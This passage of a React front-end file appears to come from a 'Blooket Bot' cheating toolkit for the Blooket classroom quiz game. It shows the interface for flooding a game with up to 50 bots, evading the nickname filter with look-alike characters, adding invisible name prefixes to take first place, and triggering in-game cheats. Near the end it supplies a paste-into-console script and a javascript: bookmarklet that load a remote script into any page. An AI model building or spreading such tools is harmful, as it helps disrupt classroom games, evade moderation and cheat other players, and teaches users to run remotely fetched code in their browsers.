      setSpawning(false);
    }
  }, [spawning, gameCode, nickname, bypassF, fpSwitch, incognito, showError]);

  const activeBots = bots.filter((b) => b.status !== "kicked");
  const connectedCount = bots.filter((b) => b.status === "connected").length;

  return (
    <div className="app-root">
      <div className="checker-bg" />
      <header className="app-header">
        <div className="header-inner">
          <span className="logo-text">Blooket Bot</span>
          <span className="header-sub">The ultimate Blooket toolkit</span>
          {isConnected && (
            <span className="header-game-badge">Game: {gameCode}</span>
          )}
        </div>
      </header>

      {error && <div className="error-bar" role="alert">{error}</div>}

      <main className="main-content">
        {/* ── Join Panel (always visible) ─────────────────────── */}
        <section className="join-card">
          <h2 className="section-title">Join a Game</h2>

          <div className="input-row">
            <div className="input-box">
              <label>Game Code</label>
              <input
                type="text"
                placeholder="e.g. 123456"
                value={gameCode}
                onChange={(e) => setGameCode(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && joinGame()}
                disabled={spawning}
              />
            </div>
            <div className="input-box">
              <label>Nickname</label>
              <input
                type="text"
                placeholder="Your bot name"
                value={nickname}
                onChange={(e) => setNickname(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && joinGame()}
                disabled={spawning}
              />
            </div>
          </div>

          <div className="toggles-row">
            <Toggle label="Incognito Mode" sublabel="Random blook" checked={incognito} onChange={setIncognito} />
            <Toggle label="Bypass Filter" sublabel="Look-alike chars" checked={bypassF} onChange={setBypassF} />
            <Toggle label="First Place Switch" sublabel="Invisible prefix" checked={fpSwitch} onChange={setFpSwitch} />
          </div>

          <button
            className={`join-btn${spawning ? " loading" : ""}`}
            onClick={joinGame}
            disabled={spawning}
          >
            {spawning && status !== "Ready" ? status : "Join Game"}
          </button>

          {/* Flood bots row */}
          <div className="flood-row">
            <div className="flood-label">Flood Bots</div>
            <div className="flood-controls">
              <input
                type="text"
                className="flood-prefix-input"
                placeholder="Name prefix (optional)"
                value={namePrefix}
                onChange={(e) => setNamePrefix(e.target.value)}
                disabled={spawning}
              />
              <input
                type="number"
                className="flood-count-input"
                min={1}
                max={50}
                value={botCount}
                onChange={(e) => setBotCount(Math.max(1, Math.min(50, parseInt(e.target.value) || 1)))}
                disabled={spawning}
              />
              <button
                className="flood-btn"
                onClick={spawnBots}
                disabled={spawning || !gameCode.trim()}
              >
                {spawning ? "Spawning…" : `Spawn ${botCount}`}
              </button>
            </div>
          </div>

          {!isConnected && (
            <div className="modes-grid">
              <h3 className="modes-title">Supported Game Modes</h3>
              <div className="modes-list">
                {Object.keys(CHEATS).map((m) => (
                  <span key={m} className="mode-tag">{m}</span>
                ))}
              </div>
            </div>
          )}
        </section>

        {/* ── My Bots Panel ──────────────────────────────────────── */}
        {activeBots.length > 0 && (
          <section className="bots-section">
            <div className="bots-header">
              <div className="bots-header-left">
                <h2 className="section-title" style={{ marginBottom: 0 }}>My Bots</h2>
                <span className="bots-count-badge">{connectedCount} connected</span>
              </div>
              <button className="kick-all-btn" onClick={kickAll}>Kick All</button>
            </div>

            <div className="bots-grid">
              {activeBots.map((bot) => (
                <BotCard
                  key={bot.id}
                  bot={bot}
                  onKick={() => kickBot(bot.id)}
                  onRename={(newName) => renameBot(bot.id, newName)}
                />
              ))}
            </div>
          </section>
        )}

        {/* ── Cheats Panel ──────────────────────────────────────── */}
        {isConnected && (
          <div className="cheats-layout">
            <div className="cheats-header">
              <div>
                <span className="connected-badge">Connected</span>
                <span className="game-type-label">{gameType || "Waiting for game…"}</span>
              </div>
              <span className="player-count">{gamePlayers.length} player{gamePlayers.length !== 1 ? "s" : ""} in game</span>
            </div>

            <div className="cheats-columns">
              {CHEATS[gameType] && (
                <section className="cheat-section">
                  <h3 className="cheat-section-title">{gameType} Cheats</h3>
                  <div className="cheat-grid">
                    {CHEATS[gameType].map((c, i) => (
                      <CheatControl
                        key={i} cheat={c} players={gamePlayers}
                        inputVals={{}} setInputVals={() => {}}
                        selectVals={{}} setSelectVals={() => {}}
                      />
                    ))}
                  </div>
                </section>
              )}

              <section className="cheat-section">
                <h3 className="cheat-section-title">Global Cheats</h3>
                <div className="cheat-grid">
                  {GLOBAL_CHEATS.map((c, i) => (
                    <CheatControl
                      key={i} cheat={c} players={gamePlayers}
                      inputVals={{}} setInputVals={() => {}}
                      selectVals={{}} setSelectVals={() => {}}
                    />
                  ))}
                </div>
              </section>

              {gamePlayers.length > 0 && (
                <section className="cheat-section">
                  <h3 className="cheat-section-title">Players in Game ({gamePlayers.length})</h3>
                  <div className="players-grid">
                    {gamePlayers.map((p) => (
                      <span key={p} className="player-pill">{p}</span>
                    ))}
                  </div>
                </section>
              )}
            </div>
          </div>
        )}
        {/* ── Console / Bookmarklet Section ────────────────────── */}
        <section className="join-card" style={{ marginTop: 16 }}>
          <h2 className="section-title">Console / Bookmarklet</h2>
          <p style={{ fontSize: 13, color: "#666", margin: "0 0 12px" }}>
            Run the full bot panel on any page — paste into your browser console, or save as a bookmark.
          </p>
          <div style={{ display: "flex", gap: 10 }}>
            <CopyScriptButton />
            <CopyBookmarkButton />
          </div>
          <p style={{ fontSize: 11, color: "#999", marginTop: 10, lineHeight: 1.5 }}>
            <strong>Console:</strong> open DevTools (F12), go to Console tab, paste and press Enter.<br />
            <strong>Bookmark:</strong> create a new bookmark, paste the URL as the bookmark address, then click it on any page.
          </p>
        </section>
      </main>
    </div>
  );
}

// ── BotCard ───────────────────────────────────────────────────────────────────

// ── Copy Buttons ──────────────────────────────────────────────────────────────

function CopyScriptButton() {
  const [label, setLabel] = useState("📋 Copy Console Script");
  const copy = async () => {
    try {
      const text = await fetch("/blooket-bot.js").then((r) => r.text());
      await navigator.clipboard.writeText(
        `var __API_ORIGIN__='${window.location.origin}';\n` + text
      );
      setLabel("✅ Copied!");
      setTimeout(() => setLabel("📋 Copy Console Script"), 2500);
    } catch {
      setLabel("❌ Failed — check permissions");
      setTimeout(() => setLabel("📋 Copy Console Script"), 2500);
    }
  };
  return (
    <button className="join-btn" style={{ flex: 1 }} onClick={copy}>
      {label}
    </button>
  );
}

function CopyBookmarkButton() {
  const [label, setLabel] = useState("🔖 Copy Bookmark URL");
  const copy = () => {
    const url =
      `javascript:(function(){var s=document.createElement('script');` +
      `s.src='${window.location.origin}/blooket-bot.js?t='+Date.now();` +
      `document.head.appendChild(s);})()`;
    navigator.clipboard.writeText(url).then(() => {
      setLabel("✅ Copied!");
      setTimeout(() => setLabel("🔖 Copy Bookmark URL"), 2500);
    }).catch(() => {
      setLabel("❌ Failed");
      setTimeout(() => setLabel("🔖 Copy Bookmark URL"), 2500);
    });
  };
  return (
    <button className="join-btn" style={{ flex: 1 }} onClick={copy}>
      {label}
    </button>
  );
}

// ── BotCard ───────────────────────────────────────────────────────────────────

function BotCard({ bot, onKick, onRename }: {
  bot: BotInstance;
  onKick: () => void;
  onRename: (name: string) => void;
}) {
  const [renaming, setRenaming] = useState(false);
  const [newName, setNewName] = useState(bot.name);
  const uid = useId();

  const statusColor =
    bot.status === "connected" ? "#22c55e" :
    bot.status === "connecting" ? "#f5a623" :
    "#e84135";
  const statusLabel =
    bot.status === "connected" ? "Connected" :
    bot.status === "connecting" ? "Connecting…" :
    bot.status === "error" ? `Error: ${bot.errorMsg ?? "failed"}` :
    "Kicked";

  const handleRename = () => {
    if (renaming) {
      onRename(newName);
      setRenaming(false);
    } else {
      setNewName(bot.name);
      setRenaming(true);
    }
  };

  return (
    <div className={`bot-card ${bot.status}`}>
      <div className="bot-card-top">
        <span className="bot-status-dot" style={{ background: statusColor }} />
        {renaming ? (
          <input
            id={uid}
            className="bot-rename-input"
            value={newName}
            autoFocus
            onChange={(e) => setNewName(e.target.value)}
            onKeyDown={(e) => { if (e.key === "Enter") handleRename(); if (e.key === "Escape") setRenaming(false); }}
          />
        ) : (
          <span className="bot-name">{bot.name}</span>
        )}
      </div>
      <div className="bot-status-text">{statusLabel}</div>
      <div className="bot-actions">
        {bot.status === "connected" && (
          <button className="bot-rename-btn" onClick={handleRename}>
            {renaming ? "Save" : "Rename"}
          </button>
        )}
        {renaming && (
          <button className="bot-cancel-btn" onClick={() => setRenaming(false)}>Cancel</button>
        )}
        {bot.status !== "error" && bot.status !== "kicked" && (
          <button className="bot-kick-btn" onClick={onKick}>Kick</button>
        )}
      </div>
    </div>
  );
}

// ── CheatControl ──────────────────────────────────────────────────────────────

interface CheatControlProps {
  cheat: CheatDef;
  players: string[];
  inputVals: Record<string, string>;
  setInputVals: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  selectVals: Record<string, string>;
  setSelectVals: React.Dispatch<React.SetStateAction<Record<string, string>>>;
}

function CheatControl({ cheat, players }: CheatControlProps) {
  const [inputVal, setInputVal] = useState("");
  const [selectVal, setSelectVal] = useState("");

  if (cheat.type === "button") {
    return (
      <button className="cheat-btn" onClick={(e) => cheat.action(e.currentTarget)}>
        {cheat.name}
      </button>
    );
  }

  if (cheat.type === "input") {
    return (
      <div className="cheat-input-group">
        <div className="cheat-input-label">{cheat.name}</div>
        <div className="cheat-input-row">
          <input
            type="text" className="cheat-input" placeholder="Value…"
            value={inputVal} onChange={(e) => setInputVal(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && cheat.action(inputVal)}
          />
          <button className="cheat-apply-btn" onClick={() => cheat.action(inputVal)}>Apply</button>
        </div>
      </div>
    );
  }

  if (cheat.type === "select") {
    const opts = cheat.computeOptions();
    return (
      <div className="cheat-input-group">
        <div className="cheat-input-label">{cheat.name}</div>
        <div className="cheat-input-row">
          <select className="cheat-select" value={selectVal} onChange={(e) => setSelectVal(e.target.value)}>
            <option value="">— select player —</option>
            {opts.map((p) => <option key={p} value={p}>{p}</option>)}
          </select>
          <button className="cheat-apply-btn" onClick={() => cheat.action(selectVal)}>Do It</button>
        </div>
      </div>
    );
  }

  if (cheat.type === "staticsel") {
    const uid = `dl-${cheat.name.replace(/\s/g, "")}`;
    return (
      <div className="cheat-input-group">
        <div className="cheat-input-label">{cheat.name}</div>
        <div className="cheat-input-row">
          <input list={uid} className="cheat-input" placeholder="Search or select…"
            value={selectVal} onChange={(e) => setSelectVal(e.target.value)} />
          <datalist id={uid}>
            {cheat.values.map((v) => <option key={v} value={v} />)}
          </datalist>
          <button className="cheat-apply-btn" onClick={() => cheat.action(selectVal)}>Apply</button>
        </div>
      </div>
    );
  }

  return null;
}

// ── Toggle ────────────────────────────────────────────────────────────────────

function Toggle({ label, sublabel, checked, onChange }: {
  label: string; sublabel: string; checked: boolean; onChange: (v: boolean) => void;
}) {
  return (
    <label className="toggle-card">
      <div className="toggle-texts">
        <span className="toggle-label">{label}</span>
        <span className="toggle-sub">{sublabel}</span>
      </div>
      <div className={`toggle-switch ${checked ? "on" : ""}`} onClick={() => onChange(!checked)}>
        <div className="toggle-knob" />
      </div>
    </label>
  );
}
